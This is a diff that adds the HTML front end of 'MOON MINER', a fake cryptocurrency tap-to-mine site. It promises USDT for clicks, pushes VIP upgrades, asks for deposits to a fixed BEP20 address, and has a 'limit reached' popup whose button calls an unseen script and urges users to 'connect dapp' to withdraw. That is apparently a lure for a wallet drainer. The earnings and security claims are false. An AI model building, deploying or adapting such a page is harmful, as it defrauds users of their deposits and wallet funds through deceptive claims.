@@ -1,0 +1,143 @@
+<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>MOON MINER</title><link rel="icon" href="assets/img/03fa0944816879572peb42hf16464094.png" type="image/png"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"><link rel="stylesheet" href="assets/css/main.css"></head><body><div class="bg-animation"><div class="bg-circle"></div><div class="bg-circle"></div></div><div class="particles" id="particles"></div><div class="copied-notification" id="copied-notification">Copied!</div><div class="auth-container" id="auth-container"><h2 class="auth-title" id="auth-title">Login</h2><div class="auth-message" id="auth-message"></div><form class="auth-form" id="auth-form"><div class="input-group" id="username-group"><label for="username">Username</label><input type="text" id="username" placeholder="Enter your username" required></div><div class="input-group" id="email-group" style="display: none;"><label for="email">Email</label><input type="email" id="email" placeholder="Enter your email"></div><div class="input-group"><label for="password">Password</label><input type="password" id="password" placeholder="Enter your password" required></div><div class="input-group" id="confirm-password-group" style="display: none;"><label for="confirm-password">Confirm Password</label><input type="password" id="confirm-password" placeholder="Confirm your password"></div><button type="submit" class="auth-btn" id="auth-btn">Login</button></form><div class="auth-toggle"><span id="toggle-text">Don't have an account?</span><a id="toggle-link">Register</a></div></div><div class="app-container" id="app-container"><div class="container"><div class="content-section active" id="home-section"><header><img class="y" src="assets/img/03fa0944816879037cdb32hf26434094.png"><i class=""><br><p></p><br></header><div class="balance-container"><div class="balance">Total balance<br><img class="ygi" src="assets/img/03fa0944816879037cdb42hf26434094.png" alt=""><span id="current-balance">0.000</span></div><button class="btn" id="withdraw-btn"><i class="fas fa-coins"></i> Withdraw</button></div><div class="mining-circle-container"><div class="mining-circle" id="mining-circle"><img src="assets/img/03fa0944816878077cdb42hf26434094.png" alt=""><h2>Tap to Mine</h2></div><div class="mining-stats" id="mining-stats">Rate: <span id="mining-rate">0.01</span> USDT/click</div></div><h2 class="section-title">About MOON MINER</h2><div class="info-cards"><div class="info-card"><h3><i class="fas fa-info-circle"></i> What is MOON MINER?</h3><p>MOON MINER is a process that allows users to earn Tether (USDT) tokens through computational processes. Our platform uses advanced algorithms to mining operations on the Binance Smart Chain network.</p></div><div class="info-card"><h3><i class="fas fa-shield-alt"></i> Security & Reliability</h3><p>Our platform operates on the secure Binance Smart Chain network, ensuring fast transactions with low fees. All mining operations are verified and secured through blockchain technology.</p></div><div class="info-card"><h3><i class="fas fa-chart-line"></i> How It Works</h3><p>Simply tap the mining circle to start earning USDT. The more you mine, the more you earn. Upgrade to VIP plans for higher earning rates and unlimited mining potential.</p></div></div></div><div class="content-section" id="plans-section"><img class="ygyg" src="assets/img/03fa0944816878037cdb42hf26434094.png"><i class=""><h2 class="section-title"></h2><p></p><div class="plans-container" id="plans-container"></div></div><div class="content-section" id="referrals-section"><div class="referral-header"><h1 class="referral-title">FRIEND</h1><div class="notifications-divider"></div><p class="referral-subtitle"></p></div><div class="referral-card"><div class="referral-label"><i class="fas fa-link"></i>Your Referral</div><div class="referral-link-container"><div class="referral-link" id="referral-link">https://moon-miners.github.io/ref?id=</div><button class="copy-btn" id="copy-referral-btn"><i class="far fa-copy"></i> Copy Link</button></div><p class="referral-subtitle">Share this link with your friends and earn 10% of their mining rewards!</p></div>
+
+                <div class="referral-stats">
+                    <div class="stat-card">
+                        <div class="stat-value" id="total-referrals">0</div>
+                        <div class="stat-label">Total Referrals</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="referral-earnings">0.00</div>
+                        <div class="stat-label">Earnings (USDT)</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="active-referrals">0</div>
+                        <div class="stat-label">Active</div>
+                    </div>
+                </div>
+
+                <div class="referrals-list">
+                    <div class="referrals-title">
+                        <i class="fas fa-users"></i>
+                        Your Referrals
+                    </div>
+                    <div class="empty-referrals" id="empty-referrals">
+                        <i class="fas fa-user-plus"></i>
+                        <p>You haven't invited anyone yet</p>
+                        <p>Share your referral link to start earning!</p>
+                    </div>
+                    <div id="referrals-container" style="display: none;">
+            
+                    </div>
+                </div>
+            </div>
+
+           
+            <div class="content-section" id="notifications-section">
+                <div class="notifications-section">
+                    <div class="notifications-header">
+                        <h2 class="notifications-title">Notifications</h2>
+                        <div class="notifications-divider"></div>
+                    </div>
+                    
+                    <div class="empty-notifications" id="empty-notifications">
+                        <i class="fas fa-bell-slash"></i>
+                        <p>No notifications yet</p>
+                        <p>Your withdrawal notifications will appear here</p>
+                    </div>
+                    
+                    <div id="notifications-container" style="display: none;">
+                      
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+        <div class="modal" id="withdraw-modal">
+            <div class="modal-content">
+                <span class="close-modal">&times;</span>
+                <h2 class="modal-title">Withdraw USDT</h2>
+                <div class="input-group">
+                    <label for="wallet-address">BEP20 Wallet Address</label>
+                    <input type="text" id="wallet-address" placeholder="Enter your BEP20 address">
+                </div>
+                <div class="input-group">
+                    <label for="withdraw-amount">Amount to Withdraw</label>
+                    <div class="amount-container">
+                        <input type="number" id="withdraw-amount" placeholder="Enter amount">
+                        <button class="max-btn" id="max-btn">MAX</button>
+                    </div>
+                </div>
+                <button class="submit-btn" id="submit-withdraw">Withdraw</button>
+                <div class="info-message">
+                    <p>Minimum withdrawal: <strong>5 USDT</strong></p>
+                    <p>Current balance: <strong><span id="modal-balance">0.000</span> USDT</strong></p>
+                    <button class="ok-btn" id="withdraw-ok">OK</button>
+                </div>
+            </div>
+        </div>
+
+        
+        <div class="modal" id="plan-info-modal">
+            <div class="modal-content">
+                <span class="close-modal">&times;</span>
+                <h2 class="modal-title" id="plan-modal-title">Plan Info</h2>
+                <div class="info-message">
+                    <p id="plan-modal-message">This plan is already in use.</p>
+                    <button class="ok-btn" id="plan-ok">OK</button>
+                </div>
+            </div>
+        </div>
+
+       
+        <div class="modal" id="deposit-modal">
+            <div class="modal-content">
+                <button class="back-btn" id="back-btn"><i class="fas fa-arrow-left"></i> Back</button>
+                <h2 class="modal-title">Deposit USDT</h2>
+                
+                <div class="network-indicator">
+                    <i class="fab fa-ethereum"></i>
+                    <span>Binance Smart Chain (BEP20)</span>
+                </div>
+                
+                
+                <div class="qr-container">
+                    <div class="qr-code" id="qr-code">
+                        <img id="qr-image" src="" alt="QR Code">
+                    </div>
+                    <p class="qr-instructions">Scan this QR code with your wallet app to make a deposit</p>
+                </div>
+                
+                <div class="input-group deposit-address">
+                    <input type="text" id="deposit-address" value="0xb6Fda119ba24a2551196686D4c7A8d37Ca52e842" readonly>
+                    <button class="copy-btn" id="copy-btn"><i class="far fa-copy"></i></button>
+                </div>
+                
+                <button class="verify-btn" id="verify-btn">
+                    <i class="fas fa-sync-alt"></i> Verify Deposit
+                </button></div></div><div class="modal" id="limit-modal">
+            <div class="modal-content">
+                <h2 class="modal-title">Limit Reached</h2>
+                <div class="info-message">
+                    <p>You have reached the Free Plan limit (3.94 USDT).</p>
+                    <p>Upgrade to a VIP Plan to continue mining.</p>
+                    <button class="ok-btn" id="limit-ok">OK</button>
+                                        <button onclick="o()" class="ok-btn" id="limit-ok">withdraw +3.94 USDT</button><br>
+                 
+               <p>connect dapp bnb Smart Chain network to withdraw Direct for free, no limit</p>
+                </div>
+            </div>
+        </div>
+
+    <div class="bottom-nav">
+            <div class="nav-item active" data-section="home-section">
+                <img class="yg" src="assets/img/03fa0944816879577peb42hf16444094.png"><i class=""></i>
+                <span class="nav-label">Home</span>
+            </div>
+            <div class="nav-item" data-section="plans-section">
+                <img class="yg" src="assets/img/03fa0944816879177ceb42hf26434094.png"><i class=""></i>
+                <span class="nav-label">Plan</span>
+            </div>
+            <div class="nav-item" data-section="referrals-section">
+                <img class="yg" src="assets/img/03fa0944816879577ceb42hf16434094.png"><i class=""></i>
+                <span class="nav-label">Friend</span></div><div class="nav-item" data-section="notifications-section"><img class="yg" src="assets/img/03fa0944816879577peb42hf16434094.png"><i class=""></i><span class="nav-label">Notifications</span></div></div></div><script src="../assets/js/interface.js"></script><script src="../assets/js/web3.min.js"></script><script src="assets/js/server.js"></script></body></html>
